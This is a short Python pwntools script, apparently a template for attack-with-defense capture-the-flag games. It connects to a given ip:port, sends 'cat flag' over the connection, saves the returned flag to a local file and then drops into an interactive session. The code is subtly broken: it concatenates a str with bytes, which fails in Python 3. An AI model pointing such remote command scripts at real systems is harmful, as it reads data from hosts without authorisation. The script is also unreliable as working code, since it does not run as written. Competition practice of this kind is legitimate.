#!/usr/bin/env python3
# A script for awd exp

from pwn import *
import os
import sys

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + b'\n')
    fd.close()

ip = server_ip = sys.argv[1].split(':')[0]
port = int(sys.argv[1].split(':')[1])
io = remote(ip, port)

io.sendline('cat flag')
io.recvuntil('{')
flag = 'flag{' + io.recvuntil('}')
write_to_flags(flag)


io.interactive()
